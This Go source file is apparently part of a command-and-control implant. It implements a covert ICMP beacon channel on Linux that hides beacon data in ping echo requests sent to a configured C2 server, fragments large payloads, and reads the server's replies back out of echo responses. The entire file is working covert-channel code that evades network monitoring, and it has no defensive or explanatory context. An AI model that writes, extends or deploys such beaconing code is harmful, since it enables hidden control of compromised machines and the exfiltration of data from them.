//go:build linux
// +build linux

package main

import (
	"fmt"
	"net"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// sendICMPBeacon sends beacon data inside ICMP echo request payload to the C2 server.
// Requires CAP_NET_RAW on Linux. Large v2 envelopes are fragmented (FC2I).
func sendICMPBeacon(body []byte) []byte {
	if C2URL == "" {
		return nil
	}
	hostPort, _, ok := currentC2Dial()
	if !ok {
		return nil
	}
	host := hostnameFromHostPort(hostPort)

	raddr, err := net.ResolveIPAddr("ip4", host)
	if err != nil {
		debugLog("ICMP resolve: " + err.Error())
		return nil
	}
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		debugLog("ICMP listen: " + err.Error())
		return nil
	}
	defer conn.Close()

	id := int(time.Now().UnixNano() & 0xFFFF)
	return sendICMPBeaconFramed(body, func(payload []byte, seq int) []byte {
		return icmpLinuxEcho(conn, raddr, id, seq, payload)
	})
}

func icmpLinuxEcho(conn *icmp.PacketConn, raddr *net.IPAddr, id, seq int, payload []byte) []byte {
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{ID: id, Seq: seq, Data: payload},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		debugLog("ICMP marshal: " + err.Error())
		return nil
	}
	if _, err := conn.WriteTo(wb, raddr); err != nil {
		debugLog("ICMP write: " + err.Error())
		return nil
	}
	reply := make([]byte, 8192)
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		return nil
	}
	n, peer, err := conn.ReadFrom(reply)
	if err != nil {
		debugLog("ICMP read: " + err.Error())
		return nil
	}
	if peer.String() != raddr.String() {
		debugLog(fmt.Sprintf("ICMP reply from unexpected source: %s", peer.String()))
		return nil
	}
	rm, err := icmp.ParseMessage(ipv4.ICMPTypeEchoReply.Protocol(), reply[:n])
	if err != nil {
		debugLog("ICMP parse: " + err.Error())
		return nil
	}
	if rm.Type != ipv4.ICMPTypeEchoReply {
		return nil
	}
	echo, ok := rm.Body.(*icmp.Echo)
	if !ok || echo.ID != id {
		return nil
	}
	return append([]byte(nil), echo.Data...)
}
